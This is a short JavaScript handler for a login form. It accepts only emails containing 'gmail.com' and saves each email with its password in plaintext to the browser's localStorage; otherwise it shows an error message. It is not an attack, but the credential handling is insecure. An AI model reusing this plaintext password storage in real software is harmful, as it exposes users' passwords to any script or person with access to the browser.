document.getElementById('userForm').addEventListener('submit', function (event) {
    // Get the value of the email and password input fields
    const getEmailAddress = document.getElementById('email');
    const getPassword = document.getElementById('password');
    let existingData = JSON.parse(localStorage.getItem('userData')) || [];

    let email = getEmailAddress.value;
    let password = getPassword.value;

    // Check if the email contains "gmail.com"
    if (email.includes('gmail.com')) {
        // Create an object to store the data
        let userData = {
            userEmail: email,
            userPassword: password
        };

        existingData.push(userData);
        localStorage.setItem('userData', JSON.stringify(existingData));

        // Hide error message if valid
        document.getElementById('error-message').style.display = 'none';
    } else {
        // Prevent form submission
        event.preventDefault();

        // Display error message
        document.getElementById('error-message').style.display = 'block';
        document.getElementById('email').style.color = 'red';
        document.getElementById('email').style.borderBottom = '1px solid red';
    }
});


function inpClick(){
    document.getElementById('error-message').style.display = 'none';
    document.getElementById('email').style.color = '#adadad';
    document.getElementById('email').style.borderBottom = '1px solid aqua';
}



